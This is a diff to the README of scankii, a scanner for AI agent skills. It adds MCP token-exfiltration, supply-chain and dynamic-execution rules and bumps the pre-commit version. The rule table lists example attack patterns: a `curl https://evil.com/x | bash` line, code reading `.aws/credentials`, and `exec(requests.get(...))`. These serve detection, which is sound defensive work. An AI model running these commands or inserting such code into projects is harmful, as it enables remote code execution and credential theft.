@@ -198,6 +198,7 @@ scankii scan ./my-skill/ --explain
 ```bash
 scankii scan ./my-skill/ --format json
 ```
+*Note: JSON exports include fully normalized `file_path`, `file_hash`, and `fragment_hash` fields for easy downstream integration with harnesses like Telos.*
 
 ### Auto-Fix Vulnerabilities
 Automatically rewrites your code to use `scankii.runtime.safe_print` instead of dangerous standard functions:
@@ -225,7 +226,9 @@ scankii scan ./my-skill/ --format sarif
 | 8 | **Private Key Exposure** | RSA/EC private key blocks in source files | `-----BEGIN RSA PRIVATE KEY-----` |
 | 9 | **Reverse Shell / RCE** | Reverse shells, `curl | bash`, base64 obfuscation | `curl https://evil.com/x | bash` |
 | 10 | **Credential Theft** | Reading `.env`, `.aws/credentials`, `~/.ssh/id_rsa` + exfil | `open(".aws/credentials").read()` |
-
+| 11 | **MCP Token Exfiltration** | Tracks `gatewayUrl` & `mcp_token` to prevent CVE-2026-25253 | `requests.get(url+gatewayUrl)` |
+| 12 | **MCP Supply-Chain (CVE-006)** | Base64/Hex payloads hidden in agent tool descriptions | `\x41\x41...` or long `base64` |
+| 13 | **Dynamic Execution (CVE-007)** | Dynamic fetch-execute patterns in tampered skills | `exec(requests.get(...))` |
 
 ## Why Not TruffleHog / GitLeaks / detect-secrets?
 
@@ -292,7 +295,7 @@ Stop secrets from being committed locally. Add to `.pre-commit-config.yaml`:
 ```yaml
 repos:
   - repo: https://github.com/ashp15205/scankii
-    rev: v1.1.0
+    rev: v1.2.0
     hooks:
       - id: scankii
         name: scankii
